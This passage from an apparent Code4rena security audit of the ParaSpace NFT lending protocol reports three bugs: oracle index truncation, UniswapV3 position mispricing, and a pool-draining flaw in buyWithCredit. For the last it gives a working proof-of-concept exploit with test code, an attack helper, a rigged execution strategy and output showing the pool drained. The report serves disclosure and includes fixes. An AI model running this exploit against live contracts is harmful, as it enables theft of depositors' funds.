function_removeAsset(address_asset)internalonlyWhenAssetExisted(_asset){uint8assetIndex=assetFeederMap[_asset].index;deleteassets[assetIndex];deleteassetPriceMap[_asset];deleteassetFeederMap[_asset];emitAssetRemoved(_asset);}
On the contrary, feeders array is being decreased:
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L326-L338
function_removeFeeder(address_feeder)internalonlyWhenFeederExisted(_feeder){uint8feederIndex=feederPositionMap[_feeder].index;if(feederIndex>=0&&feeders[feederIndex] ==_feeder) {feeders[feederIndex] =feeders[feeders.length-1];feeders.pop();}deletefeederPositionMap[_feeder];revokeRole(UPDATER_ROLE,_feeder);emitFeederRemoved(_feeder);}
I.e.assetsarray element is set to zero withdelete, but not removed from the array.
This means thatassetswill only grow over time, and will eventually surpass2^8 - 1 = 255. That’s realistic given that assets here are NFTs, whose variety will increase over time.
Once this happen the truncation will start to corrupt the indices:
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L278-L286
function_addAsset(address_asset)internalonlyWhenAssetNotExisted(_asset){assetFeederMap[_asset].registered=true;assets.push(_asset);assetFeederMap[_asset].index=uint8(assets.length-1);emitAssetAdded(_asset);}
This can happen withfeederstoo, if the count merely surpass255with net additions:
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L307-L316
function_addFeeder(address_feeder)internalonlyWhenFeederNotExisted(_feeder){feeders.push(_feeder);feederPositionMap[_feeder].index=uint8(feeders.length-1);feederPositionMap[_feeder].registered=true;_setupRole(UPDATER_ROLE,_feeder);emitFeederAdded(_feeder);}
This will lead to_removeAsset()and_removeFeeder()clearing another assets/feeders as theassetFeederMap[_asset].indexandfeederPositionMap[_feeder].indexbecome broken being truncated. It will permanently mess the structures.
Recommended Mitigation Steps
As a simplest measure consider increasing the limit to2^32 - 1:
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L278-L286
function_addAsset(address_asset)internalonlyWhenAssetNotExisted(_asset){assetFeederMap[_asset].registered=true;assets.push(_asset);-assetFeederMap[_asset].index=uint8(assets.length-1);+assetFeederMap[_asset].index=uint32(assets.length-1);emitAssetAdded(_asset);}
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L307-L316
function_addFeeder(address_feeder)internalonlyWhenFeederNotExisted(_feeder){feeders.push(_feeder);-feederPositionMap[_feeder].index=uint8(feeders.length-1);+feederPositionMap[_feeder].index=uint32(feeders.length-1);feederPositionMap[_feeder].registered=true;_setupRole(UPDATER_ROLE,_feeder);emitFeederAdded(_feeder);}
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/NFTFloorOracle.sol#L32-L48
structFeederRegistrar{// if asset registered or notboolregistered;// index in asset list-uint8index;+uint32index;// if asset paused,reject the priceboolpaused;// feeder -> PriceInformationmapping(address=>PriceInformation)feederPrice;}structFeederPosition{// if feeder registered or notboolregistered;// index in feeder list-uint8index;+uint32index;}
Also, consider actually removingassetsarray element in_removeAsset()via the usual moving of the last element as it’s done in_removeFeeder().
LSDan (judge) increased severity to High

[H-09] UniswapV3 tokens of certain pairs will be wrongly valued, leading to liquidations
Submitted byTrust
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/UniswapV3OracleWrapper.sol#L245
UniswapV3OracleWrapper is responsible for price feed of UniswapV3 NFT tokens. Its getTokenPrice() is used by the health check calculation in GenericLogic.
getTokenPrice gets price from the oracle and then uses it to calculate value of its liquidity.
function getTokenPrice(uint256 tokenId) public view returns (uint256) {UinswapV3PositionData memory positionData = getOnchainPositionData(tokenId);PairOracleData memory oracleData = _getOracleData(positionData);(uint256 liquidityAmount0, uint256 liquidityAmount1) = LiquidityAmounts.getAmountsForLiquidity(oracleData.sqrtPriceX96,TickMath.getSqrtRatioAtTick(positionData.tickLower),TickMath.getSqrtRatioAtTick(positionData.tickUpper),positionData.liquidity);(uint256 feeAmount0,uint256 feeAmount1) = getLpFeeAmountFromPositionData(positionData);return(((liquidityAmount0 + feeAmount0) * oracleData.token0Price) /10**oracleData.token0Decimal) +(((liquidityAmount1 + feeAmount1) * oracleData.token1Price) /10**oracleData.token1Decimal);}
In_getOracleData,  sqrtPriceX96 of the holding is calculated, using square root of token0Price and token1Price, corrected for difference in decimals. In case they have same decimals, this is the calculation:
if (oracleData.token1Decimal == oracleData.token0Decimal) {// multiply by 10^18 then divide by 10^9 to preserve price in weioracleData.sqrtPriceX96 = uint160((SqrtLib.sqrt(((oracleData.token0Price * (10**18)) /(oracleData.token1Price))) * 2**96) / 1E9);
The issue is that the inner calculation, could be 0, making the whole expression zero, although price is not.
((oracleData.token0Price * (10**18)) /(oracleData.token1Price))
This expression will be 0 iforacleData.token1Price > token0Price * 10**18. This is not far fetched, as there is massive difference in prices of different ERC20 tokens due to tokenomic models. For example, WETH (18 decimals) is$1300, while BTT (18 decimals) is$0.00000068.
The price is represented using X96 type, so there is plenty of room to fit the price between two tokens of different values. It is just that the number is multiplied by 2**96 too late in the calculation, after the division result is zero.
Back in getTokenPrice, the sqrtPriceX96 parameter which can be zero, is passed toLiquidityAmounts.getAmountsForLiquidity()to get liquidity values. In case price is zero, the liquidity calculator will assume all holdings are amount0, while in reality they could be all amount1, or a combination of the two.
function getAmountsForLiquidity(uint160 sqrtRatioX96,uint160 sqrtRatioAX96,uint160 sqrtRatioBX96,uint128 liquidity) internal pure returns (uint256 amount0, uint256 amount1) {if (sqrtRatioAX96 > sqrtRatioBX96)(sqrtRatioAX96, sqrtRatioBX96) = (sqrtRatioBX96, sqrtRatioAX96);if (sqrtRatioX96 <= sqrtRatioAX96) { <- Always drop here when 0amount0 = getAmount0ForLiquidity(sqrtRatioAX96,sqrtRatioBX96,liquidity);} else if (sqrtRatioX96 < sqrtRatioBX96) {amount0 = getAmount0ForLiquidity(sqrtRatioX96,sqrtRatioBX96,liquidity);amount1 = getAmount1ForLiquidity(sqrtRatioAX96,sqrtRatioX96,liquidity);} else {amount1 = getAmount1ForLiquidity(sqrtRatioAX96,sqrtRatioBX96,liquidity);}}
Since amount0 is the lower value between the two, it is easy to see that the calculated liquidity value will be much smaller than it should be, and as a result the entire Uniswapv3 holding is valuated much lower than it should. Ultimately, it will cause liquidation the moment the ratio between some uniswap pair goes over 10**18.
For the sake of completeness, healthFactor is calculated bycalculateUserAccountData, which calls_getUserBalanceForUniswapV3, which queries the oracle with_getTokenPrice.
Impact
UniswapV3 tokens of certain pairs will be wrongly valued, leading to liquidations.
Proof of Concept
Alice deposits a uniswap v3 liquidity token as collateral in ParaSpace (Pair A/B)Value of B rises in comparison to A. Now PriceB = PriceA * 10**18sqrtPrice resolves to 0, and entire liquidity is taken as A liquidity. In reality, price is between tickUpper and tickLower of the uniswap token. B tokens are not taken into consideration.Liquidator Luke initiates liquidation of Alice. Alice may lose her NFT collateral although she has kept her position healthy.
Recommended Mitigation Steps
Multiply by 2**96 before the division operation in sqrtPriceX96 calculation.

[H-10] Attacker can drain pool usingexecuteBuyWithCreditwith malicious marketplace payload
Submitted byTrust
https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/misc/marketplaces/LooksRareAdapter.sol#L59https://github.com/code-423n4/2022-11-paraspace/blob/c6820a279c64a299a783955749fdc977de8f0449/paraspace-core/contracts/protocol/libraries/logic/MarketplaceLogic.sol#L397
Paraspace supports leveraged purchases of NFTs through PoolMarketplace entry points. User calls buyWithCredit with marketplace, calldata to be sent to marketplace, and how many tokens to borrow.
function buyWithCredit(bytes32 marketplaceId,bytes calldata payload,DataTypes.Credit calldata credit,uint16 referralCode) external payable virtual override nonReentrant {DataTypes.PoolStorage storage ps = poolStorage();MarketplaceLogic.executeBuyWithCredit(marketplaceId,payload,credit,ps,ADDRESSES_PROVIDER,referralCode);}
In executeBuyWithCredit, orders are deserialized from the payload user sent to a DataTypes.OrderInfo structure. Each MarketplaceAdapter is required to fulfil that functionality through getAskOrderInfo:
DataTypes.OrderInfo memory orderInfo = IMarketplace(marketplace.adapter).getAskOrderInfo(payload, vars.weth);
If we take a look at LooksRareAdapter’s getAskOrderInfo, it will the consideration parameter using only the MakerOrder parameters, without taking into account TakerOrder params
(OrderTypes.TakerOrder memory takerBid,OrderTypes.MakerOrder memory makerAsk) = abi.decode(params, (OrderTypes.TakerOrder, OrderTypes.MakerOrder));orderInfo.maker = makerAsk.signer;consideration[0] = ConsiderationItem(itemType,token,0,makerAsk.price, // TODO: take minPercentageToAsk into accountmakerAsk.price,payable(takerBid.taker));
The OrderInfo constructed, which contains the consideration item from maker, is used in _delegateToPool, called by _buyWithCredit(), called by executeBuyWithCredit:
for (uint256 i = 0; i < params.orderInfo.consideration.length; i++) {ConsiderationItem memory item = params.orderInfo.consideration[i];require(item.startAmount == item.endAmount,Errors.INVALID_MARKETPLACE_ORDER);require(item.itemType == ItemType.ERC20 ||(vars.isETH && item.itemType == ItemType.NATIVE),Errors.INVALID_ASSET_TYPE);require(item.token == params.credit.token,Errors.CREDIT_DOES_NOT_MATCH_ORDER);price += item.startAmount;}
The total price is charged to msg.sender, and he will pay it with debt tokens + immediate downpayment.
After enough funds are transfered to the Pool contract, it delegatecalls to the LooksRare adapter, which will do the actual call to LooksRareExchange. The exchange will send the money gathered in the pool to maker, and give it the NFT.
The issue is that attacker can supply a different price in the MakerOrder and TakerOrder passed as payload to LooksRare. The maker price will be reflected in the registered price charged to user, but taker price will be the one actually transferred from Pool.
To show taker price is what counts, this is the code in LooksRareExchange.sol:
function matchAskWithTakerBid(OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk)externaloverridenonReentrant{require((makerAsk.isOrderAsk) && (!takerBid.isOrderAsk), "Order: Wrong sides");require(msg.sender == takerBid.taker, "Order: Taker must be the sender");// Check the maker ask orderbytes32 askHash = makerAsk.hash();_validateOrder(makerAsk, askHash);(bool isExecutionValid, uint256 tokenId, uint256 amount) = IExecutionStrategy(makerAsk.strategy).canExecuteTakerBid(takerBid, makerAsk);require(isExecutionValid, "Strategy: Execution invalid");// Update maker ask order status to true (prevents replay)_isUserOrderNonceExecutedOrCancelled[makerAsk.signer][makerAsk.nonce] = true;// Execution part 1/2_transferFeesAndFunds(makerAsk.strategy,makerAsk.collection,tokenId,makerAsk.currency,msg.sender,makerAsk.signer,takerBid.price,   <--- taker price is what's chargedmakerAsk.minPercentageToAsk);...}
Since attacker will be both maker and taker in this flow,  he has no problem in supplying a strategy which will accept higher taker price than maker price. It will pass this check:
(bool isExecutionValid, uint256 tokenId, uint256 amount) = IExecutionStrategy(makerAsk.strategy).canExecuteTakerBid(takerBid, makerAsk);
It is important to note that for this exploit we can pass a 0 credit loan amount, which allows the stolen asset to be any asset, not just ones supported by the pool. This is because of early return in_borrowTo()and\repay()functions.
The attack POC looks as follows:
Taker (attacker) has 10 DAIPool has 990 DAIMaker (attacker) has 1 doodle NFT.Taker submits buyWithCredit() transaction:credit amount 0TakerOrder with 1000 amountMakerOrder with 10 amount and “accept all” execution strategyPool will take the 10 DAI from taker and additional 990 DAI from it’s own funds and send to Maker.Attacker ends up with both 1000 DAI and an nToken of the NFT
Impact
Any ERC20 tokens which exist in the pool contract can be drained by an attacker.
Proof of Concept
In_pool_marketplace_buy_wtih_credit.spec.ts, add this test:
it("looksrare attack", async () => {const {doodles,dai,pool,users: [maker, taker, middleman],} = await loadFixture(testEnvFixture);const payNowNumber = "10";const poolVictimNumber = "990";const payNowAmount = await convertToCurrencyDecimals(dai.address,payNowNumber);const poolVictimAmount = await convertToCurrencyDecimals(dai.address,poolVictimNumber);const totalAmount = payNowAmount.add(poolVictimAmount);const nftId = 0;// mint DAI to offer// We don't need to give taker any money, he is not charged// Instead, give the pool moneyawait mintAndValidate(dai, payNowNumber, taker);await mintAndValidate(dai, poolVictimNumber, pool);// middleman supplies DAI to pool to be borrowed by offer later//await supplyAndValidate(dai, poolVictimNumber, middleman, true);// maker mint maycawait mintAndValidate(doodles, "1", maker);// approveawait waitForTx(await dai.connect(taker.signer).approve(pool.address, payNowAmount));console.log("maker balance before", await dai.balanceOf(maker.address))console.log("taker balance before", await dai.balanceOf(taker.address))console.log("pool balance before", await dai.balanceOf(pool.address))await executeLooksrareBuyWithCreditAttack(doodles,dai,payNowAmount,totalAmount,0,nftId,maker,taker);
Inmarketplace-helper.ts, please copy in the following attack code:
export async function executeLooksrareBuyWithCreditAttack(tokenToBuy: MintableERC721 | NToken,tokenToPayWith: MintableERC20,makerAmount: BigNumber,takerAmount: BigNumber,creditAmount : BigNumberish,nftId: number,maker: SignerWithAddress,taker: SignerWithAddress) {const signer = DRE.ethers.provider.getSigner(maker.address);const chainId = await maker.signer.getChainId();const nonce = await maker.signer.getTransactionCount();// approveawait waitForTx(await tokenToBuy.connect(maker.signer).approve((await getTransferManagerERC721()).address, nftId));const now = Math.floor(Date.now() / 1000);const paramsValue = [];const makerOrder: MakerOrder = {isOrderAsk: true,signer: maker.address,collection: tokenToBuy.address,// Listed Maker price not includes payLater amount which is stolenprice: makerAmount,tokenId: nftId,amount: "1",strategy: (await getStrategyStandardSaleForFixedPrice()).address,currency: tokenToPayWith.address,nonce: nonce,startTime: now - 86400,endTime: now + 86400, // 2 days validityminPercentageToAsk: 7500,params: paramsValue,};const looksRareExchange = await getLooksRareExchange();const {domain, value, type} = generateMakerOrderTypedData(maker.address,chainId,makerOrder,looksRareExchange.address);const signatureHash = await signer._signTypedData(domain, type, value);const makerOrderWithSignature: MakerOrderWithSignature = {...makerOrder,signature: signatureHash,};const vrs = DRE.ethers.utils.splitSignature(makerOrderWithSignature.signature);const makerOrderWithVRS: MakerOrderWithVRS = {...makerOrderWithSignature,...vrs,};const pool = await getPoolProxy();const takerOrder: TakerOrder = {isOrderAsk: false,taker: pool.address,price: takerAmount,tokenId: makerOrderWithSignature.tokenId,minPercentageToAsk: 7500,params: paramsValue,};const encodedData = looksRareExchange.interface.encodeFunctionData("matchAskWithTakerBid",[takerOrder, makerOrderWithVRS]);const tx = pool.connect(taker.signer).buyWithCredit(LOOKSRARE_ID,`0x${encodedData.slice(10)}`,{token: tokenToPayWith.address,amount: creditAmount,orderId: constants.HashZero,v: 0,r: constants.HashZero,s: constants.HashZero,},0,{gasLimit: 5000000,});await (await tx).wait();}
Finally, we need to change the passed execution strategy. InStrategyStandardSaleForFixedPrice.sol, changecanExecuteTakerBid:
function canExecuteTakerBid(OrderTypes.TakerOrder calldata takerBid, OrderTypes.MakerOrder calldata makerAsk)externalviewoverridereturns (bool,uint256,uint256){return (//((makerAsk.price == takerBid.price) &&//    (makerAsk.tokenId == takerBid.tokenId) &&//    (makerAsk.startTime <= block.timestamp) &&//    (makerAsk.endTime >= block.timestamp)),true,makerAsk.tokenId,makerAsk.amount);}
We can see the output:
maker balance before BigNumber { value: "0" }taker balance before BigNumber { value: "10000000000000000000" }pool balance before BigNumber { value: "990000000000000000000" }maker balance after BigNumber { value: "1000000000000000000000" }taker balance after BigNumber { value: "0" }pool balance after BigNumber { value: "0" }Leveraged Buy - Positive tests✔ looksrare attack (34857ms)1 passing (54s)
Recommended Mitigation Steps
It is important to validate that the price charged to user is the same price taken from the Pool contract:
// In LooksRareAdapter's getAskOrderInfo:require(makerAsk.price, takerBid.price)

